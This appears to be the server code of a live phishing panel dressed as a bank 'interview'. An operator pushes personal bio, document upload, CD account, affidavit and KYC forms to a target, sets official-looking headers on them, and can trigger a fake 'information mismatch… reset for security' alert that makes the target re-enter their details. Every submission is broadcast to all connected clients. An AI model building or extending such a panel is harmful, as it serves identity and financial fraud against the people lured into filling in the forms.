const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));

/**
 * SCREEN DATABASE REFACTOR
 * 5. Each screen is built differently. We use 'screenId' to map to 
 * specific HTML/Components on the frontend.
 */
const screenDatabase = [
    // General Category
    { name: "Welcome Screen", screenId: "WELCOME_01", category: "general", isDefault: true },
    { name: "Personal Bio Form", screenId: "BIO_FORM_FULL", category: "general" },
    { name: "Document Upload", screenId: "DOC_UPLOAD_ZONE", category: "general" },
    
    // Banking Category
    { name: "Specialty CD Form", screenId: "CD_ACCOUNT_DETAIL", category: "banking", isDefault: true },
    { name: "Affidavit Signature", screenId: "AFFIDAVIT_LEGAL_01", category: "banking" },
    { name: "KYC Verification", screenId: "KYC_COMPLEX_FORM", category: "banking" },
    
    // Data Category
    { name: "Data Analysis Task", screenId: "FIN_ANALYSIS_GRID", category: "data", isDefault: true },
    { name: "System Logic Test", screenId: "LOGIC_EVAL_SCREEN", category: "data" }
];

io.on('connection', (socket) => {

    socket.on('join_interview', (data) => {
        const { name, category } = data;
        socket.join(name); 
        
        const defaultScreen = screenDatabase.find(s => s.category === category && s.isDefault);
        
        io.emit('candidate_online', { name, category, id: socket.id });

        if (defaultScreen) {
            socket.emit('new_task', { 
                taskName: defaultScreen.name, 
                screenId: defaultScreen.screenId,
                header: "Official Documentation", // Default Header
                subHeader: "Please fill out the required fields below." // Default Sub-header
            });
        }
    });

    /**
     * 4. CUSTOMIZABLE HEADERS
     * Examiner can now send custom header/subHeader text along with the task.
     */
    socket.on('trigger_screen', (data) => {
        // data contains: candidateId, screenName, customHeader, customSubHeader
        const screenInfo = screenDatabase.find(s => s.name === data.screenName);
        
        if (screenInfo) {
            io.to(data.candidateId).emit('new_task', { 
                taskName: screenInfo.name,
                screenId: screenInfo.screenId,
                header: data.customHeader || "Verification Required",
                subHeader: data.customSubHeader || "Please provide accurate information."
            });
        }
    });

    /**
     * 2. WRONG ANSWER REFACTOR
     * When 'mark_wrong' is triggered:
     * 1. The screen DOES NOT change.
     * 2. The candidate frontend will catch this to reset the form and show alert.
     */
    socket.on('mark_wrong', (data) => {
        io.to(data.candidateId).emit('wrong_answer', { 
            message: "Information mismatch detected. The form has been reset for security. Please re-enter details." 
        });
    });

    socket.on('task_submitted', (data) => {
        // 1. Screen stays the same on candidate side (handled in UI)
        // 1. Button shows "Processing" (handled in UI)
        io.emit('notify_submission', data); 
    });

    socket.on('typing', (data) => {
        io.emit('is_typing', data.name);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Bank Server Refactored & Live on ${PORT}`);
});